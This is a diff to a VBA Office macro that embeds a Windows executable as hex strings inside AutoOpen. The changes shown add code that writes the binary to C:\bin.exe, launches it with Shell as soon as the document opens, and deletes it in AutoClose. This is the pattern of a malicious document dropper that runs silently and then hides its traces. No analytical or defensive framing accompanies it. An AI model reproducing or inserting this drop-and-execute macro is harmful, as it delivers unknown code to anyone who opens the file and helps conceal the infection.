@@ -1,8 +1,11 @@
 Sub AutoOpen()
+    Dim fileName As String
+
+    fileName = "C:\bin.exe"
+
     Dim coll As Object
+
     Set coll = CreateObject("System.Collections.ArrayList")
-    Dim index As LongLong
-    index = 0
     coll.Add "4d|5a|90|00|03|00|00|00|04|00|00|00|ff|ff|00|00|b8|00|00|00|00|00|00|00|40|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|00|80|00|00|00|0e|1f|ba|0e|00|b4|09|cd|21|b8|01|4c|cd|21|54|68|69|73|20|70|72|6f|67|72|61|6d|20|63|61|6e|6e|6f|74|20|62|65"
     coll.Add "20|72|75|6e|20|69|6e|20|44|4f|53|20|6d|6f|64|65|2e|0d|0d|0a|24|00|00|00|00|00|00|00|50|45|00|00|64|86|11|00|09|f7|00|62|00|c4|00|00|fd|05|00|00|f0|00|26|00|0b|02|02|25|00|80|00|00|00|b0|00|00|00|0c|00|00|25|11|00|00|00|10|00|00|00|00|00|40|01|00|00|00|00|10|00|00|00|02|00|00|04|00|00|00|00|00|00|00"
     coll.Add "05|00|02|00|00|00|00|00|00|90|01|00|00|06|00|00|9f|39|02|00|03|00|60|01|00|00|20|00|00|00|00|00|00|10|00|00|00|00|00|00|00|00|10|00|00|00|00|00|00|10|00|00|00|00|00|00|00|00|00|00|10|00|00|00|00|00|00|00|00|00|00|00|00|e0|00|00|34|07|00|00|00|10|01|00|e8|04|00|00|00|b0|00|00|64|05|00|00|00|00|00|00"
@@ -853,26 +856,35 @@ Sub AutoOpen()
     coll.Add "2e|72|65|66|70|74|72|2e|5f|5f|78|63|5f|61|00|2e|72|65|66|70|74|72|2e|5f|5f|78|69|5f|7a|00|2e|72|65|66|70|74|72|2e|5f|4d|49|4e|47|57|5f|49|4e|53|54|41|4c|4c|5f|44|45|42|55|47|5f|4d|41|54|48|45|52|52|00|5f|5f|69|6d|70|5f|5f|63|6f|6d|6d|6f|64|65|00|44|65|6c|65|74|65|43|72|69|74|69|63|61|6c|53|65|63|74"
     coll.Add "69|6f|6e|00|5f|5f|52|55|4e|54|49|4d|45|5f|50|53|45|55|44|4f|5f|52|45|4c|4f|43|5f|4c|49|53|54|5f|45|4e|44|5f|5f|00|2e|72|65|66|70|74|72|2e|5f|5f|78|63|5f|7a|00|5f|5f|5f|63|72|74|5f|78|74|5f|65|6e|64|5f|5f|00"
 
-    Open ("C:\bin.exe") For Binary As #1
-    
+    Dim toFile
+    Dim MyChar
+
+    Open fileName For Output As #1
     For Each elem In coll
         arr = Split(elem, "|")
         For Each hexStr In arr
-            index = index + 1
-            ' Debug.Print HexToString(CStr(hexStr))
-            Put #1, CStr(index), HexToString(CStr(hexStr))
-            'Put #1, CStr(index), CStr(index)
-            ' Debug.Print hexStr, index
+           toFile = toFile + HexToString(CStr(hexStr))
         Next
     Next
-    
+     Print #1, toFile
     Close #1
+    Call Shell(fileName, vbNormalFocus)
 End Sub
+
+Sub DeleteFile(ByVal FileToDelete As String)
+   If (Dir(FileToDelete) <> "") Then
+      ' First remove readonly attribute, if set
+      SetAttr FileToDelete, vbNormal
+      ' Then delete the file
+      Kill FileToDelete
+   End If
+End Sub
+
 
 Private Function HexToString(Value As String)
     Dim szTemp As String
     szTemp = Value
-    
+
     Dim szData As String
     szData = ""
     While Len(szTemp) > 0
@@ -885,3 +897,7 @@ Private Function HexToString(Value As String)
     Wend
     HexToString = szData
 End Function
+Sub AutoClose()
+    DeleteFile ("C:\bin.exe")
+End Sub
+
